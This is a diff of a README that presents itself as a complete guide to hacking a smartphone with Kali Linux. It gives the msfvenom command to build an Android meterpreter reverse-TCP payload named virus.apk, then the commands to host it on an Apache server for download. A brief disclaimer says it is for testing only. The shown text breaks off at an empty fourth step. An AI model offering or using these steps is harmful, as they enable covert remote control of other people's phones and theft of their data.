@@ -1,13 +1,13 @@
 # How to hack a smarphone with Kali Linux (complete guide)
-Kali linux is an OS that is focused on pentesting and ethical hacking. It if totally free and open source. In this guide you will see how you can test to gain acces to a phone with some pentesting tools. ONLY USE THIS FOR TESTING PURPOSES. **There is a file uploaded with all the configuration done. You can download it and just run the msfconsole comands at the end of the guide**
+Kali linux is an OS that is focused on pentesting and ethical hacking. It if totally free and open source. In this guide you will see how you can test to gain acces to a phone with some pentesting tools. ONLY USE THIS FOR TESTING PURPOSES. **There is a file uploaded with all the configuration done. You can download it and just run the msfconsole comands at the end of the guide.**
 
 **More info at https://www.kali.org/**
 
-## Creating the maliciuos file
+## 1)Creating the maliciuos file
 The first thing that we need to make, is to create a malicious file with the correct parameters as for making a connection between our computer and the affected device.
 #### `msfvenom -p android/meterpreter/reverse_tcp LHOST=(ENTER YOUR IP ADRESS WITHOUT THE BRACKETS) LPORT=8080  R> virus.apk`
 
-## Uploading the file to an apache server.
+## 2)Uploading the file to an apache server.
 This method consists in uploading the file to a server that is hosted by the linux machine. You can make shure if it is running by entering this command.
 
 ```sudo service apache2 status```
@@ -16,7 +16,7 @@ This method consists in uploading the file to a server that is hosted by the lin
 
 ```sudo service apache2 start```
 
-### Copying the files to the apache online server
+### 3)Copying the files to the apache online server
 Now, we need to copy the malicoius file to the apache directory, in order for making it accesible on the internet.
 
 ```scp virus.apk /var/www/html/```
@@ -25,6 +25,6 @@ Now, we need to copy the malicoius file to the apache directory, in order for ma
  
  ```cd /var/www/html/ & ls```
  
-
+ ## 4)
 
 
